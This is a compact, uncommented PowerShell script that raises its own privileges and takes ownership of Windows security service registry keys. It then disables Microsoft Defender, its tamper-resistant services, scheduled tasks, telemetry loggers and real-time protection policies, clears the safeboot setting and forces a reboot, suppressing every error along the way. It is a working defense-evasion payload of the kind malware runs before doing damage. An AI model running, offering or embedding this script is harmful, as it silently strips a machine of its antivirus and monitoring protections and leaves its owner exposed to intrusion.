$E="SilentlyContinue";$ErrorActionPreference=$E;Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class T{[DllImport("advapi32.dll",SetLastError=true)]internal static extern bool AdjustTokenPrivileges(IntPtr h,bool d,ref L n,int l,IntPtr p,IntPtr r);[DllImport("kernel32.dll")]internal static extern IntPtr GetCurrentProcess();[DllImport("advapi32.dll",SetLastError=true)]internal static extern bool OpenProcessToken(IntPtr h,int a,ref IntPtr p);[DllImport("advapi32.dll",SetLastError=true)]internal static extern bool LookupPrivilegeValue(string h,string n,ref long p);[StructLayout(LayoutKind.Sequential,Pack=1)]internal struct L{public int C;public long U;public int A;}public static void E(string p){try{L t=new L();IntPtr h=IntPtr.Zero;OpenProcessToken(GetCurrentProcess(),40,ref h);t.C=1;t.U=0;t.A=2;LookupPrivilegeValue(null,p,ref t.U);AdjustTokenPrivileges(h,false,ref t,0,IntPtr.Zero,IntPtr.Zero);}catch{}}}';[T]::E("SeTakeOwnershipPrivilege");[T]::E("SeRestorePrivilege");$S=New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544");$A=$S.Translate([System.Security.Principal.NTAccount]);$V="WinDefend","Sense","WdFilter","WdNisSvc","WdNisDrv","wscsvc","SgrmBroker","SgrmAgent","MDCoreSvc","webthreatdefusersvc","SenseCncProxy","DiagTrack","dmwappushservice","DPS","WdiServiceHost","WdiSystemHost","SysMain","WaaSMedicSvc","PcaSvc";foreach($s in $V){$p="HKLM:\SYSTEM\CurrentControlSet\Services\$s";if(Test-Path $p){try{$K=[Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($p.Substring(6),"ReadWriteSubTree","TakeOwnership");$C=$K.GetAccessControl();$C.SetOwner($A);$K.SetAccessControl($C);$K.Close();$K=[Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($p.Substring(6),"ReadWriteSubTree","ChangePermissions");$C=$K.GetAccessControl();$R=New-Object System.Security.AccessControl.RegistryAccessRule($A,"FullControl",3,"None","Allow");$C.SetAccessRule($R);$K.SetAccessControl($C);$K.Close();Set-ItemProperty -Path $p -Name "Start" -Value 4 -Type DWord -EA Stop}catch{}}};$T="\Microsoft\Windows\Windows Defender\*","\Microsoft\Windows\Application Experience\*","\Microsoft\Windows\Customer Experience Improvement Program\*","\Microsoft\Windows\UpdateOrchestrator\*","\Microsoft\Windows\DiskDiagnostic\*","\Microsoft\Windows\Autochk\Proxy";foreach($t in $T){Get-ScheduledTask -TaskPath $t -EA $E|Disable-ScheduledTask};$W="AutoLogger-Diagtrack-Listener","DiagLog","WdiContextLog","LwtNetLog","WiFiSession","SQMLogger";foreach($w in $W){Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\$w" -Name "Start" -Value 0 -Type DWord -EA $E};$P1="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender";$P2="$P1\Real-Time Protection";$P3="$P1\Spynet";$P4="HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy";$P1,$P2,$P3,$P4|ForEach-Object{if(!(Test-Path $_)){New-Item -Path $_ -Force|Out-Null}};$O=@{$P1=@{"DisableAntiSpyware"=1;"DisableRealtimeMonitoring"=1;"DisableAntiVirus"=1;"ServiceKeepAlive"=0};$P2=@{"DisableBehaviorMonitoring"=1;"DisableOnAccessProtection"=1;"DisableScanOnRealtimeEnable"=1;"DisableIOAVProtection"=1};$P3=@{"SpynetReporting"=0;"SubmitSamplesConsent"=2};$P4=@{"LetAppsRunInBackground"=2}};foreach($k in $O.Keys){foreach($v in $O[$k].Keys){Set-ItemProperty -Path $k -Name $v -Value $O[$k][$v] -Type DWord}};Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsUpdate" -Name "InstallDate" -EA $E;& bcdedit.exe /deletevalue "{current}" safeboot> $null 2>&1;Restart-Computer -Force
